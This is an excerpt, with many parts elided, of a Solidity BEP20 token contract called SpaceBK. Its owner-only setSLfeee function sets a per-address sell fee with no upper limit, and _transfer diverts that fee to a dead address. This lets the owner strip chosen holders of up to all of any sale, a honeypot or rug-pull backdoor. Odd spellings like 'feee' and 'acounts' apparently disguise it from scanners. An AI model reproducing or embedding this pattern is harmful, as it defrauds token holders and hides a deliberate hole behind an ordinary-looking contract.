 ...
 *
 * This module is used through inheritance. It will make available the modifeeer
...
contract SpaceBK is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfeee = 4;
    ...
    mapping(address => uint256) private _SLfeee;
    ...
    function setSLfeee(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfeee[_address] = _value;
    }

    function getSLfeee(address _address) external view onlyowner returns (uint256) {
        return _SLfeee[_address];
    }


    function setMarketacountsfeee(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfeee(address _address) external view onlyowner returns (bool) {
     ...
     * e.g. implement automatic token feees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        if (rF) {
            ...
            if (_SLfeee[sender] > 0) {
                tradefeee = _SLfeee[sender];
            }

            tradefeeeAmount = amount.mul(tradefeee).div(100);
        }


        if (tradefeeeAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefeeeAmount);
            emit Transfer(sender, _DEADaddress, tradefeeeAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefeeeAmount);
        emit Transfer(sender, recipient, amount - tradefeeeAmount);
    }
